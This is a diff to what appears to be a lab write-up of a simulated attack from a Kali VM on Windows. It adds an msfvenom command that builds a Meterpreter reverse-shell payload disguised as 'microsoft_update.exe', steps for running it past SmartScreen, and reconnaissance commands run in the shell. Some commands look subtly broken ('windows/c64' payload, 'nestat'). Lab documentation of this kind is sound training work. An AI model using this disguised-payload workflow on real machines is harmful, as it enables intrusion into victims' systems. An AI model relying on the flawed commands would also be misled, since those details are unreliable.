@@ -24,10 +24,12 @@ This is document details the simulated attack from the **Kali Linux Attacker VM*
 2. List the available payloads and create one for exploit
     ```bash
     msfvenom -l payloads
-
-    msfvenom -p windows/c64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
     ```
 ![List the payloads](../screenshots/list_the_payloads.png)
+
+    ```bash
+    msfvenom -p windows/c64/meterpreter_reverse_tcp lhost=192.168.20.11 lport=3344 -f exe -o microsoft_update.exe
+    ```
 ![Payload Created](../screenshots/payload_created.png)
 
 3. Set up a listener
@@ -68,4 +70,27 @@ Open another terminal in Linux and use python to establish a temporary server
     - Click `microsoft_update.exe` for download 
 
 ![Malware downloaded](../screenshots/malware_downloaded.png)
+
+3. Malware Execution
+    - Double Click `Downloads/microsoft_update.exe` in Windows
+    - Click `Run` if prompt `SmartScreen can't be reached right now`
+    - Open `Command Prompt` with administrator privilege
+    - Type the following command
+    ```bash
+    C:\Windows\system32>nestat -anob
+    ```
+![Malware Running](../screenshots/malware_running_verification.png)
+
+4. Post-Exploitation / Command & Control
+When the malware is executed successfully, a reverse shell can be opened for command and control in Kali. 
+Go back to Kali, Meterpreter is ready for ongoing invasion. The following commands were executed in the reverse shell 
+```bash
+shell
+
+whoami
+ipconfig
+systeminfo
+net user
+net localgroup
+```
 
